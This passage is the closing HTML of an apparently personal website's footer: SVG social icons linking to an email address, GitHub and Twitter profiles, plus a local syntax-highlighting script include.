01-7.94.0L6.9 9.7a2 2 0 112.26-3.3l13.14 9a3 3 0 003.4.0l13.17-9a2 2 0 112.26 3.3z" fill="#73737d"/></svg></a><span class=hidden>mailto:hcc001202@gmail.com</span>
<a href=https://github.com/ice1187><svg class="social-icon-image" width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M7 0C3.1325.0.0 3.21173.0 7.17706.0 10.3529 2.00375 13.0353 4.78625 13.9863 5.13625 14.0491 5.2675 13.8338 5.2675 13.6454 5.2675 13.4749 5.25875 12.9097 5.25875 12.3087 3.5 12.6406 3.045 11.8691 2.905 11.4653 2.82625 11.259 2.485 10.622 2.1875 10.4516 1.9425 10.317 1.5925 9.98508 2.17875 9.97611 2.73 9.96714 3.12375 10.4964 3.255 10.7118c.63 1.0855 1.63625.7805 2.03875.5921C5.355 10.8374 5.53875 10.5234 5.74 10.3439 4.1825 10.1645 2.555 9.54549 2.555 6.80026c0-.7805.27125-1.42644.7175-1.92883C3.2025 4.692 2.9575 3.95635 3.3425 2.96951c0 0 .58625-.1884 1.925.73565.56-.16149 1.155-.24223 1.75-.24223s1.19.08074 1.75.24223c1.3388-.93302 1.925-.73565 1.925-.73565C11.0775 3.95635 10.8325 4.692 10.7625 4.87143 11.2087 5.37382 11.48 6.01079 11.48 6.80026c0 2.7542-1.63625 3.36424-3.19375 3.54364C8.54 10.5682 8.75875 10.9988 8.75875 11.6717 8.75875 12.6316 8.75 13.4032 8.75 13.6454 8.75 13.8338 8.88125 14.0581 9.23125 13.9863 11.9963 13.0353 14 10.3439 14 7.17706 14 3.21173 10.8675.0 7 0z" fill="#73737d"/></svg></a><span class=hidden>https://github.com/ice1187</span>
<a href=https://twitter.com/ice1187><svg class="social-icon-image" width="17" height="14" viewBox="0 0 16 13" fill="none" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M14.0658 2.34438c.6355-.38089 1.1234-.98398 1.3532-1.702569-.5946.352628-1.2532.608749-1.9542.746789C12.9034.7905 12.1036.416748 11.2185.416748c-1.69962.0-3.07754 1.377862-3.07754 3.077362.0.24119.0272600000000001.47608.07972.70131C5.66301 4.06708 3.39543 2.84191 1.8776.980064c-.2649.454516-.41666.983156-.41666 1.547126.0 1.06766.54334 2.00961 1.36909 2.56146C2.32553 5.07268 1.85104 4.93425 1.43608 4.70376 1.43586 4.71659 1.43586 4.72949 1.43586 4.74244c0 1.49105 1.0608 2.73488 2.46862 3.01755C3.64622 7.83033 3.37436 7.86792 3.09366 7.86792 2.89537 7.86792 2.70257 7.84866 2.51471 7.81272 2.90629 9.03537 4.0428 9.92509 5.38945 9.94994c-1.05322.82536-2.38017 1.31736-3.82196 1.31736C1.31911 11.2673 1.07413 11.2528.833374 11.2243 2.19527 12.0975 3.81291 12.6069 5.55081 12.6069c5.66049.0 8.75589-4.68927 8.75589-8.75594C14.3067 3.71753 14.3037 3.5848 14.2978 3.45285 14.899 3.01896 15.4208 2.47694 15.8334 1.8598c-.5519.24476-1.145.41018-1.7676.48458z" fill="#73737d"/></svg></a><span class=hidden>https://twitter.com/ice1187</span></div></div></div></div></div><script src=/js/prism.js></script></body></html>